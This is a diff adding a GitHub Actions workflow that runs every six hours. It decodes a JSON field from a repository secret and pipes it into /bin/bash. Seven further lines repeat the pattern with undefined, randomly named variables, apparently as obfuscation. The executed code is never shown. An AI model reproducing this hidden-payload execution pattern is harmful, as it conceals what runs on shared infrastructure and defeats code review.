@@ -1,0 +1,25 @@
+name: sleepnashuijiao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sleepnashuijiao
+        env:
+          qq3: ${{ secrets.qq3 }}
+        run: |
+          echo $qq3 | jq -r .ga726 | /bin/bash
+          echo $gxqrp5616 | jq -r .w8484 | /bin/bash
+          echo $nv54577 | jq -r .mwvn4 | /bin/bash
+          echo $gjo2427 | jq -r .fa767 | /bin/bash
+          echo $y9 | jq -r .ew5 | /bin/bash
+          echo $p4155 | jq -r .lls1 | /bin/bash
+          echo $sx07 | jq -r .em84 | /bin/bash
+          echo $k30 | jq -r .fpo8 | /bin/bash
+
